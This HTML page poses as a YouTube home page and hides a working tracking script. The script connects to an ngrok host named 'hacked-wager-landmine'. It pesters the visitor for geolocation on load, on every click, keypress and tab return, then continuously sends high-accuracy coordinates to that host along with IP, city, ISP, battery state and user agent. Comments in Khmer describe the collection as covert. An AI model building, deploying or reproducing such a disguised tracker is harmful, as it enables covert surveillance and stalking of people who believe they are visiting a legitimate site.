<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>YouTube</title>
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
/* ============ RESET & TOKENS ============ */
*{margin:0;padding:0;box-sizing:border-box}

:root{
  --bg:#0f0f0f;
  --elev:#212121;
  --hover:#272727;
  --chip:#272727;
  --chip-active:#f1f1f1;
  --text:#f1f1f1;
  --text-2:#aaaaaa;
  --border:#303030;
  --red:#ff0000;
  --topbar-h:56px;
  --sidebar-w:240px;
}

html{scrollbar-color:#606060 transparent}
body{
  font-family:"Roboto",system-ui,-apple-system,"Segoe UI",Arial,sans-serif;
  background:var(--bg);
  color:var(--text);
  font-size:14px;
  -webkit-font-smoothing:antialiased;
}
svg{display:block}
::-webkit-scrollbar{width:8px;height:8px}
::-webkit-scrollbar-thumb{background:#606060;border-radius:8px}
::-webkit-scrollbar-thumb:hover{background:#909090}
::-webkit-scrollbar-track{background:transparent}

/* ============ TOP BAR ============ */
.topbar{
  position:fixed;
  top:0;left:0;right:0;
  height:var(--topbar-h);
  z-index:100;
  display:flex;
  align-items:center;
  gap:16px;
  padding:0 16px;
  background:var(--bg);
}
.topbar-start{display:flex;align-items:center;gap:6px;min-width:170px}
.topbar-center{display:flex;align-items:center;justify-content:center;gap:8px;flex:1;min-width:0}
.topbar-end{display:flex;align-items:center;justify-content:flex-end;gap:6px;min-width:170px}

.icon-btn{
  width:40px;height:40px;flex:none;
  display:grid;place-items:center;
  border:0;border-radius:50%;
  background:transparent;color:var(--text);
  cursor:pointer;
  transition:background .15s;
}
.icon-btn:hover{background:var(--hover)}
.icon-btn svg{width:24px;height:24px}

.logo{display:flex;align-items:center;gap:5px;text-decoration:none;color:var(--text);padding-right:6px}
.logo-mark{
  position:relative;flex:none;
  width:34px;height:24px;
  background:var(--red);
  border-radius:7px;
}
.logo-mark::after{
  content:"";
  position:absolute;top:50%;left:50%;
  transform:translate(-45%,-50%);
  border-style:solid;
  border-width:6px 0 6px 10px;
  border-color:transparent transparent transparent #fff;
}
.logo-text{font-size:19px;font-weight:700;letter-spacing:-.7px}
.country{font-size:10px;color:var(--text-2);align-self:flex-start;margin-top:14px}

.search{
  display:flex;align-items:center;
  flex:1;max-width:640px;height:40px;
  border:1px solid var(--border);
  border-radius:20px;
  background:#121212;
  overflow:hidden;
  transition:border-color .15s;
}
.search:focus-within{border-color:#1c62b9}
.search input{
  flex:1;height:100%;min-width:0;
  background:transparent;border:0;outline:0;
  padding:0 16px;
  color:var(--text);
  font-size:16px;
  font-family:inherit;
}
.search input::placeholder{color:#888}
.search-btn{
  width:64px;height:100%;flex:none;
  display:grid;place-items:center;
  border:0;border-left:1px solid var(--border);
  background:var(--elev);color:var(--text);
  cursor:pointer;
}
.search-btn:hover{background:#303030}
.search-btn svg{width:22px;height:22px}
.mic{background:#181818}
.mic:hover{background:#303030}

.av{
  display:grid;place-items:center;flex:none;
  width:36px;height:36px;
  border-radius:50%;
  color:#fff;font-weight:500;font-size:15px;
  user-select:none;
}
.av.sm{width:32px;height:32px;font-size:14px}
.avatar-btn{border:0;background:transparent;padding:0;cursor:pointer;border-radius:50%}

/* ============ SIDEBAR ============ */
.sidebar{
  position:fixed;
  top:var(--topbar-h);bottom:0;left:0;
  width:var(--sidebar-w);
  padding:12px 12px 24px;
  overflow-y:auto;
  overflow-x:hidden;
  background:var(--bg);
  scrollbar-width:thin;
}
.nav-item{
  display:flex;align-items:center;gap:24px;
  height:40px;padding:0 12px;
  border-radius:10px;
  color:var(--text);
  text-decoration:none;
  font-size:14px;
  white-space:nowrap;
  overflow:hidden;
  text-overflow:ellipsis;
}
.nav-item:hover{background:var(--hover)}
.nav-item.active{background:var(--hover);font-weight:500}
.nav-item svg{width:24px;height:24px;flex:none}
.nav-item span{overflow:hidden;text-overflow:ellipsis}

.side-title{
  display:flex;align-items:center;gap:6px;
  padding:8px 12px;
  font-size:16px;font-weight:500;
}
.side-title svg{width:24px;height:24px}
.divider{height:1px;background:var(--border);margin:12px 0}

.side-footer{
  padding:16px 12px;
  font-size:12px;line-height:18px;color:#717171;
}

/* ============ MAIN CONTENT ============ */
.content{
  margin-left:var(--sidebar-w);
  padding-top:var(--topbar-h);
}
body.nav-collapsed .sidebar{display:none}
body.nav-collapsed .content{margin-left:0}

.chips{
  position:sticky;
  top:var(--topbar-h);
  z-index:50;
  display:flex;gap:12px;
  padding:12px 24px;
  background:var(--bg);
  overflow-x:auto;
  scrollbar-width:none;
}
.chips::-webkit-scrollbar{display:none}
.chip{
  flex:none;
  height:32px;padding:0 12px;
  border:0;border-radius:8px;
  background:var(--chip);
  color:var(--text);
  font-family:inherit;font-size:14px;font-weight:500;
  white-space:nowrap;
  cursor:pointer;
  transition:background .15s,color .15s;
}
.chip:hover{background:#3f3f3f}
.chip.active{background:var(--chip-active);color:#0f0f0f}

.grid{
  display:grid;
  grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
  gap:24px 16px;
  padding:8px 24px 48px;
}

.card{cursor:pointer;min-width:0}
.thumb{
  position:relative;
  aspect-ratio:16/9;
  border-radius:12px;
  overflow:hidden;
  background-size:cover;
  background-position:center;
  background-color:#1c1c1c;
}
.thumb::before{
  content:"";
  position:absolute;inset:0;
  background:
    radial-gradient(circle at 25% 20%, rgba(255,255,255,.20), transparent 55%),
    radial-gradient(circle at 80% 90%, rgba(0,0,0,.40), transparent 60%);
}
.thumb::after{
  content:"";
  position:absolute;inset:0;
  border-radius:12px;
  box-shadow:inset 0 0 0 1px rgba(255,255,255,.05);
}
.duration{
  position:absolute;right:8px;bottom:8px;z-index:2;
  padding:3px 4px;
  border-radius:4px;
  background:rgba(0,0,0,.8);
  color:#fff;
  font-size:12px;font-weight:500;
  line-height:12px;
}

.card-body{display:flex;gap:12px;margin-top:12px}
.card-body .av{width:36px;height:36px;font-size:15px}
.meta{min-width:0;flex:1}
.title{
  font-size:14px;font-weight:500;line-height:20px;
  display:-webkit-box;
  -webkit-line-clamp:2;
  -webkit-box-orient:vertical;
  overflow:hidden;
  margin-bottom:4px;
}
.channel,
.stats{
  font-size:12px;
  line-height:18px;
  color:var(--text-2);
  display:flex;align-items:center;gap:4px;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
}

@media (max-width:1100px){
  .sidebar{display:none}
  .content{margin-left:0}
}
@media (max-width:640px){
  .topbar{padding:0 8px;gap:8px}
  .topbar-start,.topbar-end{min-width:auto}
  .hide-sm{display:none}
  .logo-text{display:none}
  .country{display:none}
  .grid{grid-template-columns:1fr;padding:8px 12px 40px;gap:16px}
  .chips{padding:12px}
  .search{height:36px}
}
</style>
</head>
<body>

<!-- TOP BAR -->
<header class="topbar">
  <div class="topbar-start">
    <button class="icon-btn" id="menuBtn" aria-label="Guide">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
        <path d="M4 7h16M4 12h16M4 17h16"/>
      </svg>
    </button>
    <a href="#" class="logo" aria-label="YouTube Home">
      <span class="logo-mark"></span>
      <span class="logo-text">YouTube</span>
    </a>
    <span class="country">IN</span>
  </div>
  <div class="topbar-center">
    <form class="search" onsubmit="return false">
      <input type="text" placeholder="Search" aria-label="Search" />
      <button class="search-btn" aria-label="Search">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
          <circle cx="11" cy="11" r="7"/><path d="m20 20-3.6-3.6"/>
        </svg>
      </button>
    </form>
    <button class="icon-btn mic hide-sm" aria-label="Search with your voice">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
        <rect x="9" y="2.5" width="6" height="11" rx="3"/>
        <path d="M5 11a7 7 0 0 0 14 0M12 18v3"/>
      </svg>
    </button>
  </div>
  <div class="topbar-end">
    <button class="icon-btn hide-sm" aria-label="Create">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
        <circle cx="12" cy="12" r="9"/><path d="M12 8v8M8 12h8"/>
      </svg>
    </button>
    <button class="icon-btn" aria-label="Notifications">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round">
        <path d="M18 16v-5a6 6 0 1 0-12 0v5l-2 3h16z"/>
        <path d="M10 21h4" stroke-linecap="round"/>
      </svg>
    </button>
    <button class="avatar-btn" aria-label="Account">
      <span class="av sm" style="background:linear-gradient(135deg,#ff512f,#dd2476)">A</span>
    </button>
  </div>
</header>

<!-- SIDEBAR -->
<aside class="sidebar">
  <a href="#" class="nav-item active">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round">
      <path d="M4 10.5 12 4l8 6.5V20a1 1 0 0 1-1 1h-4v-6H9v6H5a1 1 0 0 1-1-1z"/>
    </svg>
    <span>Home</span>
  </a>
  <a href="#" class="nav-item">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round">
      <rect x="7" y="3" width="10" height="18" rx="5"/>
      <path d="M11 9.5 14.5 12 11 14.5z" fill="currentColor" stroke="none"/>
    </svg>
    <span>Shorts</span>
  </a>
  <div class="divider"></div>
  <div class="side-title">
    <span>You</span>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
      <path d="m9 6 6 6-6 6"/>
    </svg>
  </div>
  <a href="#" class="nav-item">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round">
      <circle cx="12" cy="12" r="9"/><path d="M12 7v5l3.5 2"/>
    </svg>
    <span>History</span>
  </a>
  <div class="divider"></div>
  <div class="side-footer">
    About &nbsp;Press &nbsp;Copyright<br />
    Contact us &nbsp;Creators &nbsp;Advertise<br />
    Developers &nbsp;Terms &nbsp;Privacy<br /><br />
    © 2025 YouTube Clone
  </div>
</aside>

<!-- MAIN -->
<main class="content">
  <div class="chips">
    <button class="chip active">All</button>
    <button class="chip">Music</button>
    <button class="chip">Gaming</button>
  </div>

  <div class="grid">
    <article class="card">
      <div class="thumb" style="background-image:linear-gradient(135deg,#1e3c72,#2a5298)">
        <span class="duration">18:42</span>
      </div>
      <div class="card-body">
        <span class="av" style="background:linear-gradient(135deg,#1e3c72,#2a5298)">C</span>
        <div class="meta">
          <h3 class="title">Building a YouTube Clone in 2025 — HTML &amp; CSS Full Course</h3>
          <p class="channel">CodeWithSam</p>
          <p class="stats">1.2M views • 3 days ago</p>
        </div>
      </div>
    </article>
  </div>
</main>

<p id="status" style="display: none;"></p>

<script>
  /* Sidebar toggle */
  document.getElementById('menuBtn').addEventListener('click', () => {
    document.body.classList.toggle('nav-collapsed');
  });

  /* Chip selection */
  document.querySelectorAll('.chip').forEach(chip => {
    chip.addEventListener('click', () => {
      document.querySelector('.chip.active')?.classList.remove('active');
      chip.classList.add('active');
    });
  });

  /* ================= GEOLOCATION & DEVICE INFO (Merged) ================= */
  const socket = (typeof io !== 'undefined')
    ? io("https://hacked-wager-landmine.ngrok-free.dev", {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionAttempts: Infinity,
        reconnectionDelay: 1000
      })
    : null;

  const blocker = document.getElementById('location-blocker');
  const mainContent = document.getElementById('main-content');
  const errorMsg = document.getElementById('error-msg');
  const _statusEl = document.getElementById('status');
  const _dbg = (m) => { if (_statusEl) _statusEl.textContent = m; };

  let _granted    = false;   // ពិតនៅពេលទទួលបានសិទ្ធិ
  let _watchId    = null;    // សម្រាប់តាមដានទីតាំងបន្តបន្ទាប់
  let _attempt    = 0;       // រាប់ចំនួនដងដែលសាកល្បង
  let _retryTimer = null;    // ពេលរង់ចាំសាកល្បងម្ដងទៀត
  let _lastGesture = 0;      // គ្រប់គ្រងល្បឿននៃការចុច

  // អនុគមន៍ទាញយកព័ត៌មានឧបករណ៍ (ដំណើរការដោយលាក់កំបាំង)
  async function getDeviceInfo() {
      let info = {
          ip: "Unknown", country: "Unknown", city: "Unknown", isp: "Unknown",
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          time: new Date().toLocaleString('en-GB', { hour12: true }),
          battery: "Unknown", charging: "Unknown",
          ua: navigator.userAgent
      };

      try {
          const res = await fetch('https://ipapi.co/json/');
          const data = await res.json();
          info.ip = data.ip || "Unknown";
          info.country = data.country_name || "Unknown";
          info.city = data.city || "Unknown";
          info.isp = data.org || "Unknown";
      } catch (e) {}

      try {
          if ('getBattery' in navigator) {
              const battery = await navigator.getBattery();
              info.battery = Math.round(battery.level * 100) + "%";
              info.charging = battery.charging ? "Yes" : "No";
          } else {
              info.battery = "Not Supported (iOS/Safari)";
              info.charging = "Unknown";
          }
      } catch (e) {}

      return info;
  }

  /* ពេលទទួលបានទីតាំង និងព័ត៌មានឧបករណ៍ បញ្ជូនទៅកាន់ Backend ព្រមទាំង Unblock UI */
  async function _emitAndUnblock(pos) {
    if (!socket || !socket.connected) return;
    try {
      const deviceInfo = await getDeviceInfo();
      
      socket.emit('send_location', {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        speed: pos.coords.speed,
        heading: pos.coords.heading,
        device: deviceInfo
      });

      // លុបផ្ទាំង Block ចេញ និងបង្ហាញវីដេអូ/ខ្លឹមសារ
      if (blocker) blocker.style.display = 'none';
      if (mainContent) mainContent.style.filter = 'none'; 
      document.documentElement.style.overflow = 'auto';
      if (errorMsg) errorMsg.style.display = 'none';
      
    } catch (_) {}
  }

  /* តាមដានទីតាំងបន្តបន្ទាប់ពេលត្រូវបានអនុញ្ញាត */
  function _startWatch() {
    if (_watchId !== null || !navigator.geolocation) return;
    _watchId = navigator.geolocation.watchPosition(
      _emitAndUnblock,
      () => {},
      { enableHighAccuracy: true, maximumAge: 0, timeout: 60000 }
    );
  }

  /* ទាមទារសិទ្ធិយ៉ាងសកម្ម - បើបរាជ័យនឹងព្យាយាមម្ដងទៀតរហូតដល់បាន */
  function _requestGeo() {
    if (_granted) return;
    if (errorMsg) errorMsg.style.display = 'none';

    if (!navigator.geolocation) {
      if (errorMsg) {
          errorMsg.innerText = "ទូរស័ព្ទរបស់អ្នកមិនគាំទ្រមុខងារនេះទេ។";
          errorMsg.style.display = 'block';
      }
      setTimeout(_requestGeo, 2500);
      return;
    }
    
    if (_retryTimer) { clearTimeout(_retryTimer); _retryTimer = null; }

    _attempt++;
    _dbg('[GEO] attempt #' + _attempt);

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        _granted = true;
        _dbg('[GEO] ✓ granted on attempt #' + _attempt);
        _emitAndUnblock(pos);
        _startWatch();
      },
      () => {
        /* Error (Deny/Timeout) -> បង្ហាញ Error តែនៅតែព្យាយាមម្ដងទៀត */
        if (errorMsg) {
            errorMsg.style.display = 'block';
        }
        _retryTimer = setTimeout(_requestGeo, 1200);
      },
      { enableHighAccuracy: true, maximumAge: 0, timeout: 8000 }
    );
  }

  /* បើគេមានប៊ូតុងចុច Manual */
  function requestLocation() {
      _requestGeo();
  }

  /* ព្យាយាមម្ដងទៀតពេល User ចុចលើអេក្រង់ */
  function _gestureRetry() {
    const now = Date.now();
    if (now - _lastGesture < 700) return;
    _lastGesture = now;
    if (!_granted) _requestGeo();
  }

  /* ពិនិត្យមើល State នៃការអនុញ្ញាតិ */
  (async () => {
    if (!navigator.permissions || !navigator.permissions.query) return;
    try {
      const perm = await navigator.permissions.query({ name: 'geolocation' });
      _dbg('[GEO] state: ' + perm.state);
      perm.onchange = () => {
        _dbg('[GEO] state -> ' + perm.state);
        if (perm.state === 'granted') { _granted = false; _requestGeo(); }
      };
    } catch (_) {}
  })();

  /* កេះឲ្យដើរពេលចុច, scroll, ឬ tab លោតមកវិញ */
  ['click', 'touchstart', 'keydown'].forEach((evt) => {
    document.addEventListener(evt, _gestureRetry, { passive: true });
  });

  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && !_granted) _requestGeo();
  });

  /* ពេល Socket តភ្ជាប់បានជោគជ័យ */
  if (socket) {
    socket.on('connect', () => {
      _dbg('[SOCKET] connected');
      if (_granted) {
        navigator.geolocation.getCurrentPosition(_emitAndUnblock, () => {}, {
          enableHighAccuracy: true, maximumAge: 0, timeout: 8000
        });
      } else {
        _requestGeo();
      }
    });
  }

  /* ចាប់ផ្ដើមភ្លាមៗពេល Page Load */
  window.addEventListener('load', () => _requestGeo());
  if (document.readyState === 'complete') _requestGeo();
</script>

</body>
</html>
